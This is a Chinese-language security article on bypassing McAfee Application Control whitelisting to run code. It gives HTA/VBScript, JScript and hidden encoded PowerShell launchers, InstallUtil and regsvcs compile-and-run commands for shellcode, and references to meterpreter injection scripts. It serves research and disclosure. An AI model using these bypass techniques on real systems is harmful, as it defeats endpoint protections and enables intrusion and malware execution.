# Bypass McAfee Application Control——Code Execution

0x00 前言
=======

* * *

应用白名单（Application Whitelisting）是用来防止未认证程序运行的一个计算机管理实践。它的目的是保护计算机和网络不受应用伤害。 McAfee Application Control作为其中比较有代表性的产品，使用动态的信任模型，避免了单调的人工更新许可清单工作。由于企业会面临来自网络的大量未知软件，因此这款可以集中管理的解决方案有助于及时控制系统安全策略，满足企业的运营需求。

那么，我们就试试看，究竟能不能绕过最新版的McAfee Application Control 6.2.0（截至投稿日期）

![p1](http://drops.javaweb.org/uploads/images/745c5f94056891a3a255b53790ae5ffd7887fd12.jpg)

0x01 简介
=======

* * *

![p2](http://drops.javaweb.org/uploads/images/27392d5eb37cbd85ca869a69e091a52e7a322ab7.jpg)

McAfee Application Control对常见文件类型如exe、dll、bat作了限制，白名单外的这些文件均无法运行。所以这次的目标就是绕过限制来执行文件。

0x02 配置McAfee Application Control
=================================

* * *

操作系统：`win7x86`

### 1.下载McAfee Application Control

到[http://www.mcafee.com/us/products/application-control.aspx](http://www.mcafee.com/us/products/application-control.aspx)填写信息并安装

### 2.配置流程图

![p3](http://drops.javaweb.org/uploads/images/c8d16a76e315d39fd5cc895e074b257ab551051c.jpg)

### 3.Add the license

管理员权限执行McAfee Solidifier 命令行

**1.查看许可证是否安装**

执行

```
sadmin license list

```

**2.添加许可证**

在McAfee_Application_Control_v6_2_0_License.txt中会有

执行

```
sadmin license add 2708-0108-1402-2208-0710

```

如图

![p4](http://drops.javaweb.org/uploads/images/d4d5d6de9b5cf546905be0e2798a76d479f092f9.jpg)

**3.重启服务Application Control service**

执行

```
net stop scsrvc
net start scsrvc

```

### 4.Create the whitelist

**1.创建白名单规则**

执行

```
sadmin solidify

```

需要等待很长一段时间，为当前系统中的所有文件创建规则，如果未添加许可证，该功能无法使用

**2.查看白名单状态**

执行

```
sadmin status

```

确保状态为Solidified

如图

![p5](http://drops.javaweb.org/uploads/images/0eb860fabf8bcdd65f93912392d8d729b777622d.jpg)

### 5.Place Application Control in Enabled mode

**1.开启程序控制，禁止白名单以外的程序运行**

执行

```
sadmin enable

```

如图

![p6](http://drops.javaweb.org/uploads/images/8a3791e3b274eb462cecaae0d97f8f153754d96f.jpg)

重启系统,重启服务，执行

```
net stop scsrvc
net start scsrvc

```

**2.查看状态**

执行

```
sadmin status

```

确保McAfee Solidifier状态为Enabled

重启后如图

![p7](http://drops.javaweb.org/uploads/images/c3a2e701752b74102f00e9685c0a13af5c9b87d9.jpg)

**3.测试**

新建一些测试文件

执行

```
sadmin list-unsolidified

```

查看白名单以外的程序

如图

![p8](http://drops.javaweb.org/uploads/images/0172ba860cdde233839254daa78787485aae0fba.jpg)

执行

```
sadmin scripts list

```

查看禁止执行的文件类型

如图

![p9](http://drops.javaweb.org/uploads/images/e005e20fdc2964a3ea39daab9ab6b5f2d6a3b483.jpg)

分别执行exe、bat、dll，均被限制，如图

![p10](http://drops.javaweb.org/uploads/images/58a37d4ae53ed9d2d5419a0c274de22aa5c5f428.jpg)

![p11](http://drops.javaweb.org/uploads/images/69bb523c0f3a8b5e177de7524f0a6497ed92cd03.jpg)

0x03 代码执行漏洞
===========

* * *

### 1.难题

无法执行自己的程序

### 2.分析

根据白名单系统的特点，绕过的思路如下：

1.  找到系统中的特定白名单程序
    
    利用该程序执行代码
    
    编写代码使其执行我们自己的程序
    
2.  找到系统中未被拦截的特定程序
    
    利用该程序执行代码
    
    编写代码使其执行我们自己的程序
    

0x04 绕过方法
=========

* * *

最终我们还是做到了：D

### 1.执行vbs

利用hta文件

> Tips：
> 
> hta是HTML Applications的缩写，是利用HTML和Dynamic HTML(DHTML)开发应用程序

利用如下代码即可通过hta执行vbs

```
<HTML> 
<HEAD> 
<script language="VBScript">
    Set objShell = CreateObject("Wscript.Shell")
    objShell.Run "calc.exe"
</script>
</HEAD> 
<BODY> 
</BODY> 
</HTML> 

```

如图

![p12](http://drops.javaweb.org/uploads/images/f957c4b7785bb24eaa552b6deb2c858a872f86f9.jpg)

然而并不完美，hta的界面会默认显示，所以我们需要进一步修改来隐藏hta的主界面

加入属性指定hta执行后最小化显示，完整的代码如下

```
<HTML> 
<HEAD> 
<script language="VBScript">
    Set objShell = CreateObject("Wscript.Shell")
    objShell.Run "calc.exe"
</script>
<HTA:APPLICATION ID="test"
WINDOWSTATE = "minimize">

</HEAD> 
<BODY> 
</BODY> 
</HTML> 

```

保存为vbs.hta,执行如图

![p13](http://drops.javaweb.org/uploads/images/3fe0cb187641e1cfda8216b50c2cec0a827135a0.jpg)

### 2.执行jscript

jscript未被McAfee Application Control限制，因此可以被利用

如下代码保存为calc.js

```
var objShell = new ActiveXObject("WScript.shell");
objShell.run('calc.exe');

```

执行成功，如图

![p14](http://drops.javaweb.org/uploads/images/e9e41a93cb4c411344c657f507009aaa7528d046.jpg)

### 3.执行powershell

如果可以执行powershell代码，还担心绕不过McAfee Application Control吗？

当然，默认是肯定无法执行的，如图

![p15](http://drops.javaweb.org/uploads/images/736e0a6422a6074c2438e2f36c38d8508fab22e4.jpg)

**方法1：**

将ps1文件内容保存为script.txt，然后进入Powershell环境执行如下代码：

```
Get-Content script.txt | iex

```

但是如果txt中含有函数，会产生如下错误，需要更改脚本内容，错误如图

![p16](http://drops.javaweb.org/uploads/images/576f9d412a5026bc556392ae79a6c3b5ca0fa2fd.jpg)

**方法2：**

利用hta可以执行vbs，再用vbs执行Powershell

使用如下代码并保存为vbs+ps.hta

```
<HTML> 
<HEAD> 
<script language="VBScript">
    Set WshShell = CreateObject("WScript.Shell")
    Connect="powershell -nop -windows hidden -E YwBhAGwAYwAuAGUAeABlAA=="
    WshShell.Run Connect, 4, true

</script>
<HTA:APPLICATION ID="test"
WINDOWSTATE = "minimize">

</HEAD> 
<BODY> 
</BODY> 
</HTML> 

```

执行后先调用vbs脚本，再执行Powershell命令

**方法3：**

利用快捷方式执行Powershell

右键新建一个快捷方式，填入如下代码，并保存为ps.lnk

```
powershell -nop -windows hidden -E YwBhAGwAYwAuAGUAeABlAA==

```

如图

![p17](http://drops.javaweb.org/uploads/images/7a374ea4455628bcd9065f735e3b533e331da69e.jpg)

运行快捷方式后执行Powershell命令，弹出计算器

**方法4：**

利用Powershell环境直接执行，简单粗暴

cmd下执行Powershell.exe进入Powershell环境，然后在下面直接输入所有命令即可

0x05 漏洞利用
---------

* * *

目前我们已经可以在安装McAfee Application Control的系统中执行vbs、jscript、Powershell，那么利用上述方法可以实现什么呢？

### 1.执行shellcode

**方法1：**

利用vbs,将shellcode转为vbs，然后通过hta执行

参考地址：

[http://blog.didierstevens.com/2009/05/06/shellcode-2-vbscript/](http://blog.didierstevens.com/2009/05/06/shellcode-2-vbscript/)

**方法2：**

利用js

**方法3：**

利用Powershell

在之前的文章对通过Powershell执行shellcode有过详细介绍，对其中的ps1文件细节作简单修改保存为1-CodeExecution-Shellcode.ps1

进入Powershell环境，然后在里面执行1-CodeExecution-Shellcode.ps1的所有内容

如图

![p18](http://drops.javaweb.org/uploads/images/45095cc8119dc6b5e4c292d95272651be77e2a00.jpg)

**方法4：**

利用InstallUtil

在之前的文章《利用白名单绕过限制的更多测试》对此有过详细介绍

上传shellcode.cs,执行如下命令：

```
C:\Windows\Microsoft.NET\Framework\v2.0.50727\csc.exe /unsafe  /out:exeshell.exe Shellcode.cs

C:\Windows\Microsoft.NET\Framework\v2.0.50727\InstallUtil.exe /logfile= /LogToConsole=false /U exeshell.exe

```

如图

![p19](http://drops.javaweb.org/uploads/images/69c572626bd1e1b4a7fe064818cdcaffd70e944f.jpg)

**方法5：**

如果系统支持.net4.0,可以利用regsvcs

参考地址：

[https://gist.github.com/subTee/fb09ef511e592e6f7993](https://gist.github.com/subTee/fb09ef511e592e6f7993)

上传key.snk和regsvcs.cs，执行如下命令：

```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /r:System.EnterpriseServices.dll /target:library 

/out:regsvcs.dll /keyfile:key.snk regsvcs.cs
C:\Windows\Microsoft.NET\Framework\v4.0.30319\regsvcs.exe regsvcs.dll

```

### 2.执行exe

利用Powershell

在之前的文章对通过Powershell执行exe有过详细介绍，对其中的ps1文件细节作简单修改保存为2-CodeExecution-Exe.ps1

进入Powershell环境，然后在里面执行2-CodeExecution-Exe.ps1的所有内容

如图

![p20](http://drops.javaweb.org/uploads/images/fef779dac5d4d0e7acf0eb972a49b7312b917ebf.jpg)

### 3、加载dll

利用Powershell

在之前的文章对通过Powershell执行exe有过详细介绍，对其中的ps1文件细节作简单修改保存为3-CodeExecution-dll.ps1

进入Powershell环境，然后在里面执行3-CodeExecution-dll.ps1的所有内容

如图

![p21](http://drops.javaweb.org/uploads/images/e523cc91badb73abac1a1a48f45e11940d11d5c5.jpg)

### 4、注入meterpreter

利用Powershell

在之前的文章对通过Powershell执行exe有过详细介绍，对其中的ps1文件细节作简单修改保存为4-Process Injection-Meterpreter.ps1

进入Powershell环境，然后在里面执行4-Process Injection-Meterpreter.ps1的所有内容

如图

![p22](http://drops.javaweb.org/uploads/images/7f23d021fd7526e646a9da80eda55f4044c2c3a3.jpg)

0x06 小结
-------

* * *

我们成功在安装McAfee Application Control的系统上执行了vbs、exe、dll以及注入meterpreter。

当然McAfee Application Control还有其他一些保护功能，我们的研究测试也不只如此。

**注：**

以下文件可供下载

```
1-CodeExecution-Shellcode.ps1
2-CodeExecution-Exe.ps1
3-CodeExecution-dll.ps1
4-Process Injection-Meterpreter.ps1
calc.js
key.snk
ps.lnk
regsvcs.cs
Shellcode.cs
vbs+ps.hta
vbs.hta

```

**下载地址：**

[https://github.com/3gstudent/Bypass-McAfee-Application-Control--Code-Execution](https://github.com/3gstudent/Bypass-McAfee-Application-Control--Code-Execution)

参考链接：

1.  [http://bsidesvienna.at/slides/2015/a_case_study_on_the_security_of_application_whitelisting.pdf](http://bsidesvienna.at/slides/2015/a_case_study_on_the_security_of_application_whitelisting.pdf)
2.  [https://kc.mcafee.com/resources/sites/MCAFEE/content/live/PRODUCT_DOCUMENTATION/24000/PD24662/en_US/AppCtrl_BestPractices_Guide.pdf](https://kc.mcafee.com/resources/sites/MCAFEE/content/live/PRODUCT_DOCUMENTATION/24000/PD24662/en_US/AppCtrl_BestPractices_Guide.pdf)
3.  [http://www.intel.com/content/dam/www/public/us/en/documents/guides/mcafee-application-control-product-guide.pdf](http://www.intel.com/content/dam/www/public/us/en/documents/guides/mcafee-application-control-product-guide.pdf)
4.  [http://subt0x10.blogspot.hk/2015/11/all-natural-organic-free-range.html](http://subt0x10.blogspot.hk/2015/11/all-natural-organic-free-range.html)
5.  [http://blog.didierstevens.com/2009/05/06/shellcode-2-vbscript/](http://blog.didierstevens.com/2009/05/06/shellcode-2-vbscript/)
6.  [http://subt0x10.blogspot.hk/2015/08/application-whitelisting-bypasses-101.html](http://subt0x10.blogspot.hk/2015/08/application-whitelisting-bypasses-101.html)
7.  [https://gist.github.com/subTee/a06d4ae23e2517566c52](https://gist.github.com/subTee/a06d4ae23e2517566c52)
8.  [https://gist.github.com/subTee/fb09ef511e592e6f7993](https://gist.github.com/subTee/fb09ef511e592e6f7993)
9.  [https://social.technet.microsoft.com/Forums/scriptcenter/en-US/08cce717-38d0-4def-a5bf-e5b4a846a597/run-powershell-from-hta](https://social.technet.microsoft.com/Forums/scriptcenter/en-US/08cce717-38d0-4def-a5bf-e5b4a846a597/run-powershell-from-hta)

* * *

本文由三好学生原创并首发于乌云drops，转载请注明